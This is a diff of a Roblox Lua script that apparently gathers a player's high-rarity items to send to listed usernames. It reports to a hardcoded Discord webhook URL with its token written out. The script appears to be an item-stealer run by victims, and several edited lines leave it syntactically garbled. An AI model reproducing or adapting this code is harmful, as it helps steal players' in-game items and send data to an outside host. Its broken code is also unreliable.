@@ -6,7 +6,7 @@ _G.scriptExecuted = true
 
 local users = _G.Usernames or {"gravyisthebest_right,JamesBraden2"}
 local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
+local min_value = _G.min_value or "1"
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1429725379719073880/dyip9tvqFAuz2oaol1fTh9ZSOCv3vIdSDNC8VEM5Gl7_PdDq6lQe9mqAP_DCtYeGVkSr"
 
@@ -16,11 +16,11 @@ warn("You didn't add username or webhook")
 end
 
 local weaponsToSend = {}
-local Players ifgame:GetService("Players")
+local Players game:GetService("Players")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService"if
+local HttpService = game:GetService("HttpService")if
 local rarityTable = {
     "Common",
     "Uncommon",
@@ -485,6 +485,7 @@ if #weaponsToSend > 0 then
     end
     waitForUserChat()
 end
+
 
 
 
